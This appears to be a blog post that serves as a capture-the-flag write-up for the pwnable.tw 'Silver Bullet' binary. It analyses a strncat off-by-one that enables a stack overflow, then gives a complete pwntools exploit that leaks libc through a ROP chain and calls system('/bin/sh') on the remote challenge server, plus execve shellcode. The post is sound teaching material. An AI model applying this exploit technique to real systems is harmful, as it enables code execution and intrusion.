---
layout: post
title:  "Pwnable.tw - Silver Bullet"
date:   2025-01-2 19:59:45 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Silver Bullet

```bash
$ checksec ./silver_bullet
[*] '/home/itay/projects/pwnable_tw/silver_bullet/silver_bullet'
    Arch:       i386-32-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8047000)
    Stripped:   No

$ file ./silver_bullet
./silver_bullet: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter ./ld-2.23.so, for GNU/Linux 2.6.32, BuildID[sha1]=8c95d92edf8bf47b6c9c450e882b7142bf656a92, not stripped
```

## Overview

Another menu based challenge: `create_bullet, power_up_bullet, beat_werewolf, return` options. \



Sus notes:

1. `read_int` implementation - reads 0xf bytes into 0x10-byte buffer, and calls `atoi` on it. Because this buffer isn't initialized, the 16'th byte may not be `\x00`. In that case, `atoi` would read past the buffer's content. 

2. Also related to above - `atoi` doesn't reports errors. Hence, we can store some interesting buffer content there, that would get parsed properly. For ex, `atoi("1/bin/sh")` is parsed as `1`, yet leaving `/bin/sh` on the stack. 

3. The `main` function contains a local stack variable, pointing to `"Gin"` string that isn't being used. 

4. There's a local buffer of size `0x30` bytes within `main`, and it is used within the whole program. There's no canary within this challenge, hence it might be an interesting hint that the vuln involves stack linear write. 

5. `create_bullet` - reads `0x30` bytes into the above buffer using `read_input`, which is just a wrapper of `read`. Hence, it doesn't truncates the input string properly, as it doesn't null-terminates the string. Indeed, right after that, instead of using `sizeof` of the static buffer, `strlen` is being used - which may read bytes past the buffer's end. 

6. The `strlen` of the sent string serves as the "power" of the bullet. However, instead of simply sending to this function the address of `power`, it accesses this variable using `s + 0x30`. This means it assumes that the `power` local variable resides contigiously to the input buffer within the stack. This is another strong indication that the vuln involves writing the bytes past the input buffer, by controlling `power`.

7. Logical vuln - there's a naive check to prevent multiple calls to `create_bullet` - by simply verifying the input buffer's first character isn't `\x00`. However, we can set this byte using the `read_input`, hence calling this method multiple times. 

8. `power_up` - allocates new input buffer, also of size `0x30` bytes. Peforms a check that the bullet have been created using its first byte, and **verifies unsigned-check that the maximal value of power(strlen) is 0x2f**. So this seems to correctly check the first bullet's input is truncated :/

9. However, it reads another bullet into local `0x30` bytes buffer. The amount of bytes read are `0x30 - power`. Then, it calls `strncat` for this amount of bytes, concatenating the old bullet to the newer one. Notice - **this means that the maximal amount of possible concatenated bytes is `0x30`. In that case, it would create non-truncated string, as `strncat` doesn't writes null terminator if it had already written `n` bytes!** That `strncat` updates the outer input's frame. 

10. The new power is calculated by `strlen` on the new buffer, which might be `0x30` bytes, adding it to the previous power. So to sum up, this method may generate non-truncated `0x30` buffer. 

11. `beat` - this method first prints the werewolf's name (using `%s`) and hp. If we can corrupt this struct, it may serve as a read primitive. 

12. The werewolf's `hp` member is defined as a **signed integer**, which is pretty sus. This 32-bit value is decremented by the bullet's `power`, which is the preceding byte past the buffer's end. As we've seen, under legitimate flow, this is the `strlen` on the bullet's buffer. Another sus point, is the fact that `power` is treated as a signed integer within the `beat` method's context.

13. The werewolf object is initialized on `main`'s stack frame, with `hp = 0x7fffffff`, and crap name string. It may indicate the hp might have something to do with addresses corruption. 

## Exploitation

Before thinking what can we do within the `beat` method that would lead to corruption, 
let us think of interesting flows using the fact that we have infinite calls of `create_bullet, power_up`. \
Once a bullet's first character is non `\x00`, `create_bullet` can no longer be called. Hence, assume we'd call `create_bullet` once, and `power_up` multiple times. \
After reading `man strncat` abit, I've recalled the following horrible functionallity: *If src contains n or more bytes, strncat() writes n+1 bytes to dest*.

*Slowly Claps*. \
Great design decision glibc writers, who cares the `count` parameter is `n`, if we can troll and write `n + 1` bytes!

This means that the byte past the `0x30` input buffer, which is the previous `power`, is being reset back to `0`. \
Hence, the updated value of `new_power` would be only the `strlen` of the secondary bullet string, hence - producing a mismatch between the bullet's actual length (which is `0x30` non-null bytes) and its recorded length. 
Furthermore, it would allow us to trivially concatenate up to `0x30` bytes past the bullet's buffer. 

### Write primitive

The write primitive is trivial - `0x30` bytes linear write on the stack, starting at certain offset within the `main`'s stack frame. 

### Branch Primitive

Recall we have the following layout, right after triggering the vuln:

```bash
pwndbg> x/30wx 0xffc05884
0xffc05884:     0x41414141      0x41414141      0x41414141      0x41414141
0xffc05894:     0x42424242      0x42424242      0x42424242      0x42424242
0xffc058a4:     0x43434342      0x43434343      0x43434343      0x43434343
0xffc058b4:     0x0000000f      0x00000000      0xea484637      0x00000001
0xffc058c4:     0xffc05954      0xffc0595c      0x00000000      0x00000000
0xffc058d4:     0x00000000      0xea61c000      0xea64cc04      0x00000001
0xffc058e4:     0x00000000      0xea61c000      0xea61c000      0x00000000
```

As we can see, I've created a scenario where the input buffer's real length is `0x30` bytes, while its recorded "power" is `0xf` (it is possible for this value to be even `1`). \
Hence, for the next call of `power_up` we would be able to write up to `0x30` bytes on the stack, starting at `0xffc058b4`. 
`0xea484637` stands for `__libc_start_main`, which is the return address of the `main` function. Hence, overwriting this content with the start of our ROP chain would yield trivial branch primitive. 

### Read primitive

While the `beat` method seems redundant, overwriting the werewolf's `name` member seems valuable, as it may give us an arbitrary read primitive, due to `printf("%s", werewolf->name)`. \
We can fully control the `hp` member, hence - making the program's while loop to end gracefully. \
Because there's no direct read primitive, I'd simply call a small ROP chain that would trigger `puts(puts)` (or similar) - leaking libc address, and jump back to `main`, restarting our program for the real ROP. 

## Solution

```python
#!/usr/bin/python3

from pwn import *

HOST = 'chall.pwnable.tw'
PORT = 10103
context.arch='i386'
BINARY = './silver_bullet'
LIBC = './libc_32.so.6'
LD = './ld-2.23.so'

GDB_SCRIPT = '''
b *0x80488fb
commands
    p "gonna strncat.."
end

c
'''

SHELLCODE = '''
mov ebx, {0}
xor ecx, ecx
xor edx, edx
push 0x0b
pop eax
int 0x80

BIN_SH:
.ascii "/bin/sh"
.byte 0x00
'''

# Unfortunately, x86 doesn't supports "lea ebx, [eip + BIN_SH]". Moved the raw offset for it..
OFFSET_TO_BIN_SH = 0x0e

def unsigned(n, bitness=32):
    if n < 0:
        n = n + 2**bitness
    return n

def pad(buf, alignment, delimiter=b'\x00'):
    if (len(buf) % alignment) == 0:
        return buf

    extra = (alignment - (len(buf) % alignment)) * delimiter
    return buf + extra

def splitted(buf, n):
    for i in range(0, len(buf), n):
        yield buf[i: i + n]

def chunkSize(alloc_size):
    assert(alloc_size >= 0)
    min_size = alloc_size + SIZEOF_PTR
    res = min_size % (2 * SIZEOF_PTR)
    pad = (2 * SIZEOF_PTR) - res if res else 0
    return min_size + pad

def allocSize(chunkSize):
    assert((chunkSize & 0xf) == 0)
    return chunkSize - SIZEOF_PTR

def recvPointer(p):
    leak = p.recv(SIZEOF_PTR)
    assert(len(leak) == SIZEOF_PTR)
    leak = u32(leak)
    return leak

###### Constants ######
IS_DEBUG = False
IS_REMOTE = True
SIZEOF_PTR = 4
BULLET_SIZE = 0x30


###### Offsets ######

###### Addresses ######
binary = ELF(BINARY)
main_binary = binary.symbols['main']
puts_got = binary.got['puts']
puts_plt = binary.plt['puts']

libc = ELF(LIBC)
bin_sh_libc = next(libc.search(b'/bin/sh'))
system_libc = libc.symbols['system']
puts_libc = libc.symbols['puts']
log.info(f'bin_sh_libc: {hex(bin_sh_libc)}')
log.info(f'system_libc: {hex(system_libc)}')
log.info(f'puts_libc: {hex(puts_libc)}')


libc_rop = ROP(LIBC)
pop_eax_ret = libc_rop.eax.address
pop_ebx_ret = libc_rop.ebx.address
pop_ecx_ret = libc_rop.ecx.address
pop_edx_ret = libc_rop.edx.address
leave_ret = libc_rop.find_gadget(['leave']).address
int_80 = libc_rop.find_gadget(['int 0x80']).address
log.info(f'pop_eax_ret: {hex(pop_eax_ret)}')
log.info(f'pop_ebx_ret: {hex(pop_ebx_ret)}')
log.info(f'pop_ecx_ret: {hex(pop_ecx_ret)}')
log.info(f'pop_edx_ret: {hex(pop_edx_ret)}')
log.info(f'leave_ret: {hex(leave_ret)}')
log.info(f'int_80: {hex(int_80)}')


def create_bullet(p, buf):
    p.recvuntil(b'Your choice :')
    p.sendline(b'1')
    p.recvuntil(b'Give me your description of bullet :')
    p.sendline(buf)
    p.recvuntil(b'Good luck !!')

def power_up(p, buf):
    p.recvuntil(b'Your choice :')
    p.sendline(b'2')
    p.recvuntil(b'Give me your another description of bullet :')
    p.sendline(buf)
    p.recvuntil(b'Enjoy it !')   

def beat(p):
    p.recvuntil(b'Your choice :')
    p.sendline(b'3')
    p.recvuntil(b'Oh ! You win !!\n')

def trigger_rop(p, rop_bytes):
    buf_1 = b'A' * (BULLET_SIZE - 1)
    create_bullet(p, buf_1)
    # Corrupt power to \x01 (while the real size is 0x30)
    buf_2 = b'B'
    power_up(p, buf_2)
    # Ovewrite stack
    buf_3 = b'\xff' * 3  # Set power to 0xffffff01
    buf_3 += b'C' * 4  # pad
    buf_3 += rop_bytes 
    power_up(p, buf_3)
    # Terminate loop - run the above small ROP chain (leaks + jumps back to main)
    beat(p)

def leak_libc(p):
    rop_bytes = p32(puts_plt)
    rop_bytes += p32(main_binary)
    rop_bytes += p32(puts_got)
    trigger_rop(p, rop_bytes)
    libc_leak = recvPointer(p) 
    libc_base = libc_leak - puts_libc
    assert((libc_base & 0xfff) == 0)
    return libc_base

def pop_shell(p, libc_base):
    rop_bytes = p32(libc_base + system_libc)
    rop_bytes += p32(main_binary)
    rop_bytes += p32(libc_base + bin_sh_libc)
    trigger_rop(p, rop_bytes)

def exploit(p):
    libc_base = leak_libc(p)
    log.info(f'libc_base: {hex(libc_base)}')
    pop_shell(p, libc_base)

def main():
    if IS_DEBUG:
        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    else:
        if IS_REMOTE:
            p = remote(HOST, PORT)
        else:
            p = process(BINARY)

    exploit(p)

    log.info('Win')
    p.interactive()

if __name__ == '__main__':
    main()
```

The solution is pretty straightforward - 2 ROP chains, the first 1 serves for a read primitive, leaking libc address, adn the second one - to call `system`. \
The main lesson from this challenge, is that there is some crazy shit with glibc functions. I find it completely wrecked that `strncat` with `count == n`, may actually overwrite `n + 1` bytes. 
